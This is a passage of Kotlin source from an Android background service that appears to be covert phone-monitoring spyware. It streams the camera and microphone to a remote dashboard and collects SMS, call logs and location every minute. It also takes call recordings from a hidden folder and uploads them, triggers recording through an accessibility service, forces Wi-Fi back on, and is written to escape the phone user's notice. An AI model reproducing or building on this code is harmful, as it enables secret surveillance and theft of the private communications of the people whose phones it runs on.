                    set(CaptureRequest.JPEG_QUALITY, liveJpegQuality.toByte())
                }.build()

                capSession.setRepeatingRequest(req, null, handler)

                // BUG-R12: Camera session is confirmed open — now safe to notify dashboard
                sendCommandAck("camera_live_start", "success")
                sendHealthStatus("camera_live_on")

                // Bug 4.5: Await join() before next use
                // keep alive loop
                while (isActive && isCameraLiveStreaming && activeWebSocket != null) {
                    delay(1000)
                }

            } finally {
                isCameraLiveStreaming = false
                try { session?.close() } catch (_: Exception) {}
                try { if (cameraClosed.compareAndSet(false, true)) camera?.close() } catch (_: Exception) {}
                try { imageReader.close() } catch (_: Exception) {}
                try { thread.quitSafely() } catch (_: Exception) {}
            }
        }
    }

    private fun restartCameraLiveStream() {
        if (!isCameraLiveStreaming) return
        val nextFacing = if (cameraLiveFacing == CameraCharacteristics.LENS_FACING_FRONT)
            CameraCharacteristics.LENS_FACING_FRONT
        else
            CameraCharacteristics.LENS_FACING_BACK
        val nextStrictFacing = cameraLiveStrictFacing
        isCameraLiveStreaming = false
        val oldJob = cameraLiveJob
        oldJob?.cancel()
        serviceScope.launch(Dispatchers.IO) {
            cameraLiveMutex.withLock {
                try {
                    // Bug 4.5: Await join() before starting new stream
                    oldJob?.join()
                } catch (_: CancellationException) {
                }
                startCameraLiveStream(nextFacing, nextStrictFacing)
            }
        }
    }

    private fun stopCameraLiveStream(reason: String) {
        // Bug 4.7: Check wasLive BEFORE setting false to avoid race
        val wasLive = isCameraLiveStreaming
        isCameraLiveStreaming = false
        cameraLiveJob?.cancel()
        cameraLiveJob = null
        if (wasLive && reason != "service_destroy") {
            sendCommandAck("camera_live_stop", "success")
            sendHealthStatus("camera_live_off_$reason")
        }
    }

    private fun optimizePhotoJpeg(source: ByteArray, isFrontCamera: Boolean = false): ByteArray {
        return try {
            val qualityMode = photoQualityMode
            val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            BitmapFactory.decodeByteArray(source, 0, source.size, bounds)
            
            // Use full resolution for HD, reasonable for others (no aggressive crop)
            val maxEdge = when (qualityMode) {
                "fast" -> 1280   // Reduced for size
                "hd" -> 4096     // Full 4K / 8MP+ detail
                else -> 2560     // Balanced
            }
            var sample = 1
            while ((bounds.outWidth / sample) > maxEdge || (bounds.outHeight / sample) > maxEdge) {
                sample *= 2
            }
            val opts = BitmapFactory.Options().apply { inSampleSize = sample.coerceAtLeast(1) }
            var bitmap = BitmapFactory.decodeByteArray(source, 0, source.size, opts) ?: return source
            
            // Apply EXIF orientation to ensure upright image without relying on metadata
            try {
                val exif = ExifInterface(java.io.ByteArrayInputStream(source))
                val orientation = exif.getAttributeInt(ExifInterface.TAG_ORIENTATION, ExifInterface.ORIENTATION_NORMAL)
                val matrix = android.graphics.Matrix()
                when (orientation) {
                    ExifInterface.ORIENTATION_ROTATE_90 -> matrix.postRotate(90f)
                    ExifInterface.ORIENTATION_ROTATE_180 -> matrix.postRotate(180f)
                    ExifInterface.ORIENTATION_ROTATE_270 -> matrix.postRotate(270f)
                    ExifInterface.ORIENTATION_FLIP_HORIZONTAL -> matrix.postScale(-1f, 1f)
                    ExifInterface.ORIENTATION_FLIP_VERTICAL -> { matrix.postRotate(180f); matrix.postScale(-1f, 1f) }
                    ExifInterface.ORIENTATION_TRANSPOSE -> { matrix.postRotate(90f); matrix.postScale(-1f, 1f) }
                    ExifInterface.ORIENTATION_TRANSVERSE -> { matrix.postRotate(270f); matrix.postScale(-1f, 1f) }
                }
                if (!matrix.isIdentity) {
                    val rotated = android.graphics.Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
                    if (rotated !== bitmap) {
                        bitmap.recycle()
                        bitmap = rotated
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Failed to apply EXIF rotation: ${e.message}")
            }
            
            // Mirror front camera so selfies match preview orientation
            if (isFrontCamera) {
                val mirrorMatrix = android.graphics.Matrix()
                mirrorMatrix.postScale(-1f, 1f, bitmap.width / 2f, bitmap.height / 2f)
                val mirrored = android.graphics.Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, mirrorMatrix, true)
                if (mirrored !== bitmap) {
                    bitmap.recycle()
                    bitmap = mirrored
                }
            }
            
            val enhanced = if (aiPhotoEnhancementEnabled) {
                // Detect capture mode based on brightness
                val avgLuma = ImageEnhancer.estimateLuma(bitmap)
                val mode = when {
                    photoNightMode != "off" -> ImageEnhancer.CaptureMode.NIGHT
                    else -> ImageEnhancer.detectMode(avgLuma)
                }
                
                Log.d(TAG, "Photo enhancement: luma=$avgLuma, mode=$mode")
                
                // Apply full enhancement pipeline
                ImageEnhancer.enhance(bitmap, mode, null)
            } else {
                bitmap
            }
            
            // Network-aware compression
            val jpegBytes = ImageEnhancer.compress(enhanced, lowNetworkMode, qualityMode)
            
            // BUG-L1 fix: Always recycle in safe order — enhanced first (if different),
            // then original. Avoids double-recycle if enhance() returns same instance.
            if (enhanced !== bitmap) {
                enhanced.recycle()
            }
            if (!bitmap.isRecycled) {
                bitmap.recycle()
            }
            
            jpegBytes
        } catch (e: Exception) {
            Log.w(TAG, "optimizePhotoJpeg failed: ${e.message}")
            source
        }
    }


    private fun applyColorAdjust(
        source: android.graphics.Bitmap,
        contrast: Float,
        brightness: Float,
        saturation: Float,
    ): android.graphics.Bitmap {
        val out = source.copy(android.graphics.Bitmap.Config.ARGB_8888, true)
        val satMatrix = ColorMatrix().apply { setSaturation(saturation) }
        val c = contrast
        val t = (-0.5f * c + 0.5f) * 255f + brightness
        val conMatrix = ColorMatrix(
            floatArrayOf(
                c, 0f, 0f, 0f, t,
                0f, c, 0f, 0f, t,
                0f, 0f, c, 0f, t,
                0f, 0f, 0f, 1f, 0f,
            )
        )
        satMatrix.postConcat(conMatrix)
        val canvas = Canvas(out)
        val paint = android.graphics.Paint(android.graphics.Paint.ANTI_ALIAS_FLAG).apply {
            colorFilter = ColorMatrixColorFilter(satMatrix)
        }
        canvas.drawBitmap(source, 0f, 0f, paint)
        return out
    }

    // ────────────────────────────────────────────────────────────────────────
    // Data collection — location, SMS, call log, media (every 60s)
    // ────────────────────────────────────────────────────────────────────────

    private fun startDataCollection() {
        stopDataCollection()
        dataJob = serviceScope.launch(Dispatchers.IO) {
            // Send immediately on connect, then periodically
            while (isActive) {
                sendDeviceData()
                // Bug 5: 5 min on low-network, 60s normal — saves ~96% data polling bandwidth
                delay(if (lowNetworkMode) 300_000L else 60_000L)
            }
        }
    }

    private fun stopDataCollection() {
        dataJob?.cancel()
        dataJob = null
    }
    
    // ────────────────────────────────────────────────────────────────────────
    // Local Call Recording Uploader Loop
    // ────────────────────────────────────────────────────────────────────────

    private fun startRecordingUploader() {
        recordingUploaderJob?.cancel()
        recordingUploaderJob = serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                scanAndUploadRecordings()
                delay(15 * 60 * 1000L) // 15 minute interval
            }
        }
    }

    private fun stopRecordingUploader() {
        recordingUploaderJob?.cancel()
        recordingUploaderJob = null
    }

    private val isScanningRecordingsGuard = java.util.concurrent.atomic.AtomicBoolean(false)

    private suspend fun scanAndUploadRecordings() {
        // EDGE CASE: Prevent simultaneous manual scan and automatic interval scan 
        if (!isScanningRecordingsGuard.compareAndSet(false, true)) {
            Log.i(TAG, "Recording scan already in progress, skipping duplicate request.")
            return
        }
        try {
            val dirsToScan = mutableListOf<File>()
            
            val hiddenDir = File(applicationContext.filesDir, "hidden_calls")
            if (hiddenDir.exists() && hiddenDir.isDirectory) dirsToScan.add(hiddenDir)
            
            if (dirsToScan.isEmpty()) return

        // EDGE CASE FIX 1: Track successfully uploaded files to prevent infinite upload loops
        // if Android Scoped Storage prevents us from deleting the file locally.
        val uploadedKey = "uploaded_records_history"
        val uploadedFiles = prefs.getStringSet(uploadedKey, mutableSetOf())?.toMutableSet() ?: mutableSetOf()
        
        // LOOPHOLE FIX: Prune missing files to prevent SharedPreferences memory leak over time
        val existingUploaded = uploadedFiles.filter { File(it).exists() }
        if (existingUploaded.size < uploadedFiles.size) {
            uploadedFiles.retainAll(existingUploaded.toSet())
            prefs.edit().putStringSet(uploadedKey, uploadedFiles).apply()
        }

        val files = mutableListOf<File>()
        for (dir in dirsToScan) {
            try {
                files.addAll(dir.walkTopDown()
                    .maxDepth(3)
                    .filter { it.isFile && it.name.matches(Regex(".*\\.(mp3|m4a|wav|amr|aac|ogg|opus|mkv)$", RegexOption.IGNORE_CASE)) }
                    .take(50)
                    .toList())
            } catch (e: Exception) {
                Log.e(TAG, "Error scanning directory ${dir.absolutePath}: ${e.message}")
            }
        }

        for (file in files) {
            // Check if the recording uploader job is still active
            if (recordingUploaderJob?.isActive != true) break
            
            // EDGE CASE: Skip empty placeholder files native recorders create immediately on call start
            if (file.length() == 0L) {
                // LOOPHOLE FIX: If it's 0 bytes and older than 1 minute, it's a dead/failed recording. Delete it to prevent storage bloat.
                if (System.currentTimeMillis() - file.lastModified() > 60_000L) file.delete()
                continue
            }

            // EDGE CASE FIX 1: If file was previously uploaded but undeletable, skip to prevent infinite loop
            if (uploadedFiles.contains(file.absolutePath)) {
                // Do nothing here. We must wait for the PC dashboard to send the 'delete_recording' command.
                continue
            }
            
            // EDGE CASE FIX 2: Explicitly skip the currently active recording file
            if (CallRecorder.isRecording && file.absolutePath == CallRecorder.currentOutputFile?.absolutePath) {
                continue
            }

            // EDGE CASE: If a call is actively ongoing, the file is still being written to.
            // Increased to 60 seconds to guarantee the call has ended before we steal and delete the file.
            if (System.currentTimeMillis() - file.lastModified() < 60_000L) {
                continue
            }

            var success = false
            try {
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("deviceId", deviceId)
                    .addFormDataPart("recording", file.name, file.asRequestBody("audio/*".toMediaTypeOrNull()))
                    .build()

                val request = Request.Builder()
                    .url("$serverHttpBaseUrl/api/upload-recording")
                    .post(requestBody)
                    // EDGE CASE FIX 2: Removed X-Filename header. OkHttp crashes if file.name contains Unicode/Emojis.
                    // The backend Express/Multer will safely fall back to reading `req.file.originalname`.
                    .addHeader("X-Device-Id", deviceId)
                    .apply { if (wsAuthToken.isNotBlank()) addHeader("X-Auth-Token", wsAuthToken) }
                    .build()

                Log.i(TAG, "Uploading recording: ${file.name} (${file.length()} bytes)")
                val response = recordingUploadClient.newCall(request).execute()
                if (response.isSuccessful) {
                    Log.i(TAG, "Successfully uploaded recording: ${file.name}")
                    success = true
                } else {
                    Log.e(TAG, "Failed to upload recording ${file.name}, HTTP code: ${response.code}")
                }
                response.close()
            } catch (e: Exception) {
                Log.e(TAG, "Exception uploading recording ${file.name}: ${e.message}")
            }

            if (success) {
                // DO NOT delete here. Wait for PC dashboard to download and send the delete command.
                uploadedFiles.add(file.absolutePath)
                prefs.edit().putStringSet(uploadedKey, uploadedFiles).apply()
                Log.i(TAG, "Recording uploaded and kept on device until PC confirms download: ${file.name}")
            }
        }
        } finally {
            isScanningRecordingsGuard.set(false)
        }
    }

    private fun setupCallListener() {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            try {
                telephonyManager.registerTelephonyCallback(
                    mainExecutor,
                    object : TelephonyCallback(), TelephonyCallback.CallStateListener {
                        override fun onCallStateChanged(state: Int) {
                            handleCallState(state)
                        }
                    }
                )
            } catch (e: Exception) { Log.e(TAG, "Failed to register TelephonyCallback: ${e.message}") }
        } else {
            try {
                @Suppress("DEPRECATION")
                telephonyManager.listen(object : PhoneStateListener() {
                    @Deprecated("Deprecated in Java")
                    override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                        handleCallState(state)
                    }
                }, PhoneStateListener.LISTEN_CALL_STATE)
            } catch (e: Exception) { Log.e(TAG, "Failed to register PhoneStateListener: ${e.message}") }
        }
    }

    private fun handleCallState(state: Int) {
        when (state) {
            TelephonyManager.CALL_STATE_OFFHOOK -> {
                Log.i(TAG, "Native call active — pausing mic stream & triggering ODialer Record")
                stopAudioCapture("call_started")

                // Only trigger if AccessibilityService hasn't already claimed this call
                if (MonitorAccessibilityService.autoRecordTriggered) {
                    Log.i(TAG, "Record already triggered by AccessibilityService — skipping MicService trigger")
                    return
                }

                // Claim the trigger and schedule the click
                Handler(android.os.Looper.getMainLooper()).postDelayed({
                    val service = MonitorAccessibilityService.instance
                    if (service != null) {
                        Log.i(TAG, "Triggering ODialer Record button click via AccessibilityService")
                        service.clickRecordButton(retry = 0)
                    } else {
                        Log.w(TAG, "AccessibilityService not running — cannot auto-click Record")
                    }
                }, 2500)
            }
            TelephonyManager.CALL_STATE_IDLE -> {
                Log.i(TAG, "Native call ended — resuming mic stream")
                // Reset auto-record state so next call can trigger fresh
                MonitorAccessibilityService.resetAutoRecordState()
                // ODialer handles its own recording stop; we just resume our mic capture
                if (wantsMicStreaming && !isCapturing && !isWebRtcStreaming) {
                    serviceScope.launch {
                        delay(500) // Give ODialer time to release resources
                        startAudioCapture()
                    }
                }
            }
        }
    }

    private fun setupWhatsAppCallReceiver() {
        if (whatsAppCallReceiver != null) return
        whatsAppCallReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                when (intent?.action) {
                    ACTION_WHATSAPP_CALL_START -> {
                        Log.i(TAG, "WhatsApp call detected, pausing live mic stream.")
                        stopAudioCapture("whatsapp_call_started")
                    }
                    ACTION_WHATSAPP_CALL_END -> {
                        Log.i(TAG, "WhatsApp call ended, resuming live mic stream if wanted.")
                        if (wantsMicStreaming && !isCapturing && !isWebRtcStreaming) {
                            serviceScope.launch {
                                delay(500) // Give recorder time to release mic
                                startAudioCapture()
                            }
                        }
                    }
                }
            }
        }
        val filter = IntentFilter().apply {
            addAction(ACTION_WHATSAPP_CALL_START)
            addAction(ACTION_WHATSAPP_CALL_END)
        }
        ContextCompat.registerReceiver(this, whatsAppCallReceiver, filter, ContextCompat.RECEIVER_NOT_EXPORTED)
    }


    private fun startNetworkEnforcer() {
        if (networkEnforcerJob?.isActive == true) return
        networkEnforcerJob = serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                if (prefs.getBoolean("network_locked", false)) {
                    try {
                        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
                        if (wifiManager?.isWifiEnabled == false) {
                            Log.i(TAG, "Network locked: Auto-re-enabling Wi-Fi")
                            wifiManager.setWifiEnabled(true)
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Failed to enforce Wi-Fi: ${e.message}")
                    }
                }
                delay(3000)
            }
        }
    }

    /**
     * Open auto-start settings for Chinese ROMs (Realme, Xiaomi, Vivo, etc.)
     * Returns true if successfully opened a settings activity
     */
    private fun openAutoStartSettings(): Boolean {
        val manufacturer = android.os.Build.MANUFACTURER.lowercase()
        Log.i(TAG, "Opening auto-start settings for manufacturer: $manufacturer")
        
        val autoStartIntents = when {
            manufacturer in listOf("oppo", "realme") -> listOf(
                // Realme UI 2.0+ / ColorOS 11+
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.coloros.safecenter",
                    "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                )),
                // Realme UI 1.0 / ColorOS 7
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.coloros.safecenter",
                    "com.coloros.safecenter.startupapp.StartupAppListActivity"
                )),
                // Oppo ColorOS
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.oppo.safe",
                    "com.oppo.safe.permission.startup.StartupAppListActivity"
                )),
                // ColorOS 12+ / Realme UI 3+
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.oplus.safecenter",
                    "com.oplus.safecenter.permission.startup.StartupAppListActivity"
                ))
            )
            manufacturer in listOf("xiaomi", "redmi") -> listOf(
                // MIUI 12+
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"
                )),
                // Older MIUI
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.permissions.PermissionsEditorActivity"
                ))
            )
            manufacturer == "vivo" -> listOf(
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.iqoo.secure",
                    "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"
                )),
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.vivo.permissionmanager",
                    "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
                ))
            )
            manufacturer == "huawei" || manufacturer == "honor" -> listOf(
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                )),
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.huawei.systemmanager",
                    "com.huawei.systemmanager.optimize.process.ProtectActivity"
                ))
            )
            manufacturer == "oneplus" -> listOf(
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.oneplus.security",
                    "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"
                ))
            )
            else -> emptyList()
        }
        
        for (intent in autoStartIntents) {
            try {
                intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                if (intent.resolveActivity(packageManager) != null) {
                    startActivity(intent)
                    Log.i(TAG, "Opened auto-start settings: ${intent.component}")
                    return true
                }
            } catch (e: Exception) {
                Log.w(TAG, "Could not open ${intent.component}: ${e.message}")
            }
        }
        
        Log.w(TAG, "No auto-start settings found for $manufacturer")
        return false
    }

    private fun sendDeviceData() {
        try {
            val data = dataCollector.collectAll()
            // Bug 5: Hash-based change detection — use precise checksum to avoid 32-bit collisions
            val smsArray = data.optJSONArray("sms")
            val callArray = data.optJSONArray("callLog")
            
            // BUG-L4 fix: Use first + last item dates for stronger dedup.
            // Old hash only checked count + first date, missing delete/insert same-date edge cases.
            val smsThumb = if (smsArray != null && smsArray.length() > 0) smsArray.optJSONObject(0)?.optLong("date") ?: 0L else 0L
            val smsLastThumb = if (smsArray != null && smsArray.length() > 1) smsArray.optJSONObject(smsArray.length() - 1)?.optLong("date") ?: 0L else 0L
            val callThumb = if (callArray != null && callArray.length() > 0) callArray.optJSONObject(0)?.optLong("date") ?: 0L else 0L
            val callLastThumb = if (callArray != null && callArray.length() > 1) callArray.optJSONObject(callArray.length() - 1)?.optLong("date") ?: 0L else 0L
            
            val hashStr = "${smsArray?.length()}_${smsThumb}_${smsLastThumb}_${callArray?.length()}_${callThumb}_${callLastThumb}"
            if (hashStr == lastDataHashStr) {
                Log.d(TAG, "Device data unchanged, skipping send")
                return
            }
            lastDataHashStr = hashStr
            val msg = JSONObject()
            msg.put("type", "device_data")
            msg.put("deviceId", deviceId)
            msg.put("data", data)
            safeSend(msg.toString())
            Log.d(TAG, "Device data sent (changed)")
        } catch (e: Exception) {
            Log.e(TAG, "sendDeviceData error: ${e.message}")
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // Audio capture loop (raw PCM 16-bit mono 16 kHz)
    // ────────────────────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission")  // Permission already checked in MainActivity before service starts
    private fun startAudioCapture() {
        if (!wantsMicStreaming) return
        if (isWebRtcStreaming) return
        if (!isCapturingGuard.compareAndSet(false, true)) return
        if (isDeviceInCall()) {
            Log.w(TAG, "Mic start blocked: device is currently in call")
            sendHealthStatus("blocked_on_call")
            isCapturingGuard.set(false)
            return
        }
        Log.i(TAG, "[MIC] Starting audio capture loop")
        isCapturing = true
        lastAudioChunkSentAt = System.currentTimeMillis()
        lastPingSentAt = lastAudioChunkSentAt

        audioCaptureJob = serviceScope.launch(Dispatchers.IO) {
            // ── PRIORITY BOOST: Audio thread and network binding ─────────────
            // Set highest audio priority for this thread
            try {
                android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_AUDIO)
            } catch (e: Exception) {
                Log.w(TAG, "Could not set audio thread priority: ${e.message}")
            }
            audioCaptureStoppedExternally.set(false)
            
            // Bug 4: DO NOT call bindProcessToNetwork() — it pins ALL sockets
            // (WebSocket, HTTP, etc.) to one network. When that network drops,
            // ALL connections fail until audio capture restarts. The system's
            // default routing already handles WiFi↔Cellular transitions cleanly.
            
            // Monitoring: MODE_NORMAL for all profiles — avoids HAL AEC/NS/beamforming
            // that MODE_IN_COMMUNICATION enables on Qualcomm and similar (not controllable via AudioEffect).
            val am = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            try {
                am?.isMicrophoneMute  = false   // ensure mic is not software-muted
                am?.isSpeakerphoneOn  = false   // speakerphone off — avoids feedback loop
                am?.mode = AudioManager.MODE_NORMAL
            } catch (e: Exception) {
                Log.w(TAG, "Failed to configure audio manager: ${e.message}")
            }
            ourAudioMode = false
            
            // Some OEMs (Vivo/Realme) silently set IN_COMMUNICATION when a WS socket is open.
            // Poll and force back to NORMAL if overridden.
            serviceScope.launch(Dispatchers.IO) {
                repeat(5) {
                    delay(1000)
                    if (am?.mode != AudioManager.MODE_NORMAL && !isDeviceInCall()) {
                        am?.mode = AudioManager.MODE_NORMAL
                    }
                }
            }

            // FIX: Do NOT request any AudioFocus at all.
            // AudioRecord with VOICE_RECOGNITION does NOT auto-request focus.
            // Requesting AUDIOFOCUS_GAIN_TRANSIENT_MAY_DUCK causes:
            //   - Media volume to decrease on the remote device
            //   - Some OEMs (Realme/Vivo) interpret ANY focus request as "pause media"
            // By not requesting focus, YouTube/Facebook/etc continue playing undisturbed
            // and device volume stays at the user's chosen level.
            
            // HQ Buffered Mode Removed (Issue M-08)
            var rotateSourceOnExit = false
            try {
                audioRecord = createAudioRecordWithFallback()

                if (audioRecord == null) {
                    Log.e(TAG, "AudioRecord failed to initialize")
                    safeSend("{\"type\":\"error\",\"message\":\"mic_init_failed\",\"deviceId\":\"$deviceId\"}")
                    isCapturing = false
                    if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                    sendHealthStatus("mic_init_failed")
                    return@launch
                }

                audioRecord?.startRecording()
                resetEnhancerState()   // clear filter memory from any prior session
                Log.i(TAG, "🎙️ Audio capture started (${sampleRate}Hz, PCM16, mono)")
                sendHealthStatus("mic_started")

                var chunk = ByteArray(audioReadBufferSize.coerceAtLeast(streamChunkSize))
                var consecutiveReadErrors = 0
                var nearSilentFrames = 0
                val captureStartedAtMs = System.currentTimeMillis()
                var lastRecordingFlushAt = System.currentTimeMillis()
                // Bug 2.1: Cache at loop start
                var targetChunkSize = streamChunkSize
                val frameBuffer = ByteArray(audioReadBufferSize.coerceAtLeast(streamChunkSize * 2))
                var frameFill = 0

                while (isCapturing && isActive) {
                    // Bug 2.1: Recalculate only if frame duration changed, not every iteration
                    val currentFrameMs = currentStreamFrameMs()
                    val newTargetChunkSize = ((sampleRate * 2 * currentFrameMs) / 1000).coerceAtLeast(640)
                    if (chunk.size != newTargetChunkSize) {
                        chunk = ByteArray(newTargetChunkSize)
                        targetChunkSize = newTargetChunkSize
                        frameFill = 0
                        Log.i(TAG, "Adjusted audio frame size to ${currentFrameMs}ms ($newTargetChunkSize bytes)")
                    }

                    val read = if (frameFill < targetChunkSize) {
                        val readTarget = minOf(frameBuffer.size - frameFill, audioReadBufferSize, targetChunkSize - frameFill)
                        audioRecord?.read(frameBuffer, frameFill, readTarget) ?: -1
                    } else {
                        // Skip blocking read if we already have a full chunk ready to process
                        delay(1)
                        0
                    }

                    if (read > 0) {
                        frameFill += read
                    }

                    if (frameFill >= targetChunkSize) {
                        System.arraycopy(frameBuffer, 0, chunk, 0, targetChunkSize)
                        val remaining = frameFill - targetChunkSize
                        if (remaining > 0) {
                            System.arraycopy(frameBuffer, targetChunkSize, frameBuffer, 0, remaining)
                        }
                        frameFill = remaining
                        consecutiveReadErrors = 0
                        // Some OEMs initialize a source successfully but feed near-zero samples.
                        // Detect prolonged near-silence and rotate to the next source automatically.
                        var peakAbs = 0
                        var i = 0
                        while (i + 1 < targetChunkSize) {
                            val s = readLeSample(chunk, i)
                            val abs = kotlin.math.abs(s)
                            if (abs > peakAbs) peakAbs = abs
                            i += 2
                        }
                        // Rotate source only for true digital-near-zero capture during startup.
                        // Normal quiet rooms or speech pauses must not trigger source restarts.
                        nearSilentFrames = if (peakAbs < 50) (nearSilentFrames + 1) else 0
                        val startupWindow = (System.currentTimeMillis() - captureStartedAtMs) <= 15_000L
                        // FIX Issue 1: Raised from < 1 to < 3 — some OEMs need multiple
                        // source rotations before finding a working mic path.
                        if (nearSilentFrames >= 150 && startupWindow && sourceRotateAttempts < 3 && !isDeviceInCall()) {
                            val sourceCount = preferredAudioSources().size.coerceAtLeast(1)
                            audioSourceRotation = (audioSourceRotation + 1) % sourceCount
                            sourceRotateAttempts++
                            rotateSourceOnExit = true
                            isCapturing = false
                            sendHealthStatus("mic_source_rotate")
                            Log.w(TAG, "Mic near-silent with source=$activeAudioSource, rotating source")
                            continue
                        }
                        if (aiAutoModeEnabled) {
                            updateAutoAiProfile(chunk, targetChunkSize)
                        }
                        
                        // Check TCP buffer bloat / extreme lag on weak WiFi
                        val qSize = activeWebSocket?.queueSize() ?: 0L
                        val queuedSamples = qSize / 2
                        if (queuedSamples > 24000L) { // 1.5s at 16kHz
                            if (!isNetworkLagging) {
                                Log.w(TAG, "Network lagging! WS queue size: $qSize bytes. Forcing MuLaw & 40ms chunks.")
                                isNetworkLagging = true
                            }
                        } else if (queuedSamples < 8000L) {
                            isNetworkLagging = false
                        }

                        // ══════════════════════════════════════════════════════════════════
                        // REALTIME MODE ──────────────────────────────────────────────────
                        // ══════════════════════════════════════════════════════════════════
                        if (System.currentTimeMillis() % 10000 < 100) {
                            Log.d(TAG, "Realtime mode active (isWebRtcStreaming=$isWebRtcStreaming)")
                        }
                        // Issue A: Compute codec ONCE per chunk, share between gain + encode.
                        val codec = if (!isWebRtcStreaming) chooseWsFallbackCodec() else AUDIO_CODEC_PCM16_16K
                        lastCodecChoice = codec
                        val willBeMuLaw = codec == AUDIO_CODEC_MULAW_8K

                        // Trick 2 + 3: adaptive upward gain for far voices + soft peak limiter
                        val pcmData = if (isWebRtcStreaming) {
                            chunk.copyOf(targetChunkSize)
                        } else {
                            applyFarVoiceGain(chunk, targetChunkSize, willBeMuLaw)
                        }

                        // 1) Live stream via legacy WS path only when WebRTC is inactive
                        if (!isWebRtcStreaming) {
                            if (qSize > 96_000L) {
                                // FATAL LAG AVOIDANCE: If queue exceeds 3 seconds, the stream is hopelessly behind.
                                // Drop the WebSocket frame entirely so the network can catch up to real-time.
                                Log.w(TAG, "WS queue overloaded ($qSize bytes) - dropping WS audio frame to preserve real-time playback")
                            } else {
                                // Issue A: Inline encoding — no second chooseWsFallbackCodec() call
                                val payload = if (willBeMuLaw) pcm16ToMuLaw(pcmData) else pcmData
                                val encoded = ByteArray(4 + payload.size)
                                encoded[0] = 0x4D.toByte(); encoded[1] = 0x4D.toByte()
                                encoded[2] = 0x01; encoded[3] = codec
                                System.arraycopy(payload, 0, encoded, 4, payload.size)
                                if (safeSend(encoded.toByteString())) {
                                    lastAudioChunkSentAt = System.currentTimeMillis()
                                    lastAudioChunkSentAtMs = lastAudioChunkSentAt
                                    if (lastAudioChunkSentAt - lastPingSentAt >= 10_000) {
                                        lastPingSentAt = lastAudioChunkSentAt
                                        sendHealthStatus("audio_tick")
                                    }
                                } else {
                                    Log.w(TAG, "Audio send failed - stopping capture for reconnect")
                                    isCapturing = false
                                    break
                                }
                            }
                        }

                    } else if (read < 0) {
                        if (read == AudioRecord.ERROR_DEAD_OBJECT) {
                            Log.e(TAG, "AudioRecord dead object detected")
                            safeSend("{\"type\":\"error\",\"message\":\"mic_dead_object\",\"deviceId\":\"$deviceId\"}")
                            sendHealthStatus("mic_dead_object")
                            break
                        } else {
                            consecutiveReadErrors++
                            if (consecutiveReadErrors >= 5) {
                                Log.e(TAG, "AudioRecord read failed repeatedly: $read")
                                safeSend("{\"type\":\"error\",\"message\":\"mic_read_error\",\"deviceId\":\"$deviceId\"}")
                                sendHealthStatus("mic_read_error")
                                break
                            }
                            try { delay(100) } catch (_: CancellationException) { break }
                        }
                    } else {
                        // zero read: let watchdog decide if stream is stalled
                        try {
                            delay(10)
                        } catch (_: CancellationException) {
                            break
                        }
                    }
                }
            } catch (_: CancellationException) {
                Log.i(TAG, "Audio capture coroutine cancelled")
            } catch (e: Exception) {
                // Bug G: Ignore the double-stop exception if we already triggered capturing to stop (e.g., from safeSend -> onWsDisconnected)
                if (!isCapturing && e is IllegalStateException) {
                    Log.i(TAG, "Audio capture loop stopped cleanly (IllegalStateException ignored)")
                    return@launch
                }
                Log.e(TAG, "Audio capture error", e)
                if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                isCapturing = false
                sendHealthStatus("mic_error")
            } finally {
                val wasCapturing = isCapturing
                isCapturing = false
                val stoppedExternally = audioCaptureStoppedExternally.getAndSet(false)
                val rec = audioRecord
                if (rec != null) {
                    if (!stoppedExternally) {
                        try { rec.stop() } catch (_: Exception) {}
                    }
                    releaseSessionAudioEffects()
                    try { rec.release() } catch (_: Exception) {}
                    audioRecord = null
                }
                isCapturingGuard.set(false)
                if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                Log.i(TAG, "Audio capture stopped")
                sendHealthStatus("mic_stopped")

                if (isActive && rotateSourceOnExit && wantsMicStreaming && activeWebSocket != null && !isWebRtcStreaming) {
                    delay(350)
                    startAudioCapture()
                } else if (isActive && wasCapturing && wantsMicStreaming && activeWebSocket != null && !isWebRtcStreaming) {
                    // Capture loop exited unexpectedly while stream is still requested.
                    delay(500)
                    startAudioCapture()
                }
            }
        }
    }

    private fun startMicWatchdog() {
        if (micWatchdogJob?.isActive == true) return
        micWatchdogJob = serviceScope.launch(Dispatchers.IO) {
